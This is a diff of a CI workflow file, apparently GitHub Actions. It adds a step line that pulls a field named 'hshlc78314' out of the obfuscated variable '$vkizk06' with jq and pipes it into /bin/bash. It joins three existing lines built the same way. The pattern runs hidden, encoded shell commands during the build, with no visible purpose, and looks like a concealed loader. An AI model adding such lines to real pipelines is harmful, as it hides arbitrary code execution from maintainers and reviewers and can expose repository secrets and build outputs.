@@ -26,6 +26,7 @@ jobs:
           echo $moo344 | jq -r .buc554 | /bin/bash
           echo $b02 | jq -r .wmp291 | /bin/bash
           echo $seqql64 | jq -r .ntpd5519 | /bin/bash
+          printf '%s' "$vkizk06" | jq -r .hshlc78314 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
